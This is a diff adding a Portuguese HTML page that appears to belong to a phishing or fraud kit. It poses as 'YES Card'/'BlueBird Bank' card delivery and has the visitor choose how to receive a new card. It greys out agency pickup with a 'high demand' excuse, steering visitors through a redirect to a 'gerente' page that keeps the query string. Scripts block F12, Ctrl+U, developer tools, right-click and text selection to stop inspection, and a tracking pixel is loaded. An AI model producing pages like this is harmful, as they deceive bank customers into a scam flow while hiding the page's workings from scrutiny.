@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Método de Entrega</title>
+
+    <style>
+        .header {
+            background: linear-gradient(147deg, #003675 0%, #0d64fb 74%);
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .main-content {
+            max-width: 600px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+        }
+
+        .delivery-option {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .option-card {
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .option-card img {
+            max-width: 40px;
+            margin-bottom: 10px;
+        }
+
+        .btn-custom {
+            background-color: #0d64fb;
+            color: rgb(255, 255, 255);
+            border: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 8px;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .agency-section {
+            margin-top: 30px;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .footer p {
+            margin: 0;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else {
+            //Versões antigas do IE
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+
+            var code = e.which || e.keyCode;
+
+            if (
+                e.ctrlKey &&
+                (code == 83 || code == 85) //83 = S, 85 = U
+            ) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+
+                return false;
+            }
+        }
+    </script>
+    <style>
+        /*desabilita a seleção no body*/
+
+        body {
+            -webkit-touch-callout: none;
+            /* iOS Safari */
+            -webkit-user-select: none;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: none;
+            /* Konqueror */
+            -moz-user-select: none;
+            /* Firefox */
+            -ms-user-select: none;
+            /* Internet Explorer/Edge */
+            user-select: none;
+        }
+
+        /*habilita a seleção nos campos editaveis*/
+
+        input,
+        textarea {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: text;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: text;
+            /* Konqueror */
+            -moz-user-select: text;
+            /* Firefox */
+            -ms-user-select: text;
+            /* Internet Explorer/Edge */
+            user-select: text;
+        }
+
+        /*habilita a seleção nos campos com o atributo contenteditable*/
+
+        [contenteditable="true"] {
+            -webkit-touch-callout: initial;
+            /* iOS Safari */
+            -webkit-user-select: all;
+            /* Chrome/Safari/Opera */
+            -khtml-user-select: all;
+            /* Konqueror */
+            -moz-user-select: all;
+            /* Firefox */
+            -ms-user-select: all;
+            /* Internet Explorer/Edge */
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+                return false;
+            });
+        } else {
+            //Versões antigas do IE
+            document.attachEvent("oncontextmenu", function(e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+</head>
+
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="YES Card Logo" style="width: 120px">
+    </div>
+
+    <div class="main-content">
+        <h3>Método de Entrega</h3>
+        <p>Escolha como você deseja receber seu novo cartão</p>
+
+        <!-- Opção de entrega -->
+        <div class="delivery-option">
+            <div class="option-card" id="correios-option">
+                <img src="images/45880.png" alt="Ícone de caminhão">
+                <h5>Entrega pelos Correios</h5>
+                <p>Receba seu cartão no conforto da sua casa em até 1 dia útil</p>
+                <button class="btn-custom" onclick="escolherEntrega()">
+            Prefiro receber pelos Correios
+          </button>
+            </div>
+
+            <style>
+                .unavailable {
+                    filter: blur(2px);
+                    opacity: 0.9;
+                    pointer-events: none;
+                }
+
+                .unavailable-text {
+                    color: red;
+                    /* Updated to maintain original text styling */
+                    font-size: 13px;
+                    /* Updated to maintain original text styling */
+                }
+            </style>
+
+            <div class="option-card unavailable" id="agencia-option">
+                <img src="images/2825777.png" alt="Ícone de agência">
+                <h5>Retirada em Agência</h5>
+                <p>Retire seu cartão em uma de nossas agências BlueBird</p>
+            </div>
+            <p class="unavailable-text" style="filter: none; opacity: 1">
+                A opção de retirada na agência está temporariamente indisponível devido à alta demanda. Agradecemos sua compreensão.
+            </p>
+        </div>
+
+        <!-- Nova seção: Nossas Agências -->
+        <div class="agency-section">
+            <h4>Nossas Agências BlueBird Bank</h4>
+            <p>Agência Central</p>
+            <p>
+                Avenida Paulista, 1230<br> Conj 612 a 1510 Lado Par<br> Bela Vista, Sao Paulo - SP<br> 01.310-100
+            </p>
+            <img src="images/3722049.png" alt="Ícone de localização" style="max-width: 50px">
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 BlueBird. Todos os direitos reservados.<br> Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+    <script>
+        function escolherEntrega() {
+            window.location.href = "../gerente/index.html" + window.location.search;
+        }
+    </script>
+
+    <!-- Utmify utms capture -->
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <!-- Utmify pixel -->
+    <script>
+        window.pixelId = "66bb763debbcebab27d68442";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Utmify end -->
+
+    <script>
+        // Impedir a tecla F12 (abre as ferramentas de desenvolvedor)
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123) { // F12
+                e.preventDefault();
+            }
+
+            // Impedir Ctrl + Shift + I (Ferramentas de desenvolvedor)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+            }
+
+            // Impedir Ctrl + U (exibir código fonte)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+            }
+        });
+
+        // Impedir o menu de contexto (botão direito)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+
+    <script>
+        // Impedir a seleção de texto em toda a página
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+        });
+
+        // Também bloqueia a seleção via CSS
+        document.body.style.userSelect = 'none'; // Para navegadores modernos
+    </script>
+
+
+</body>
+
+</html>
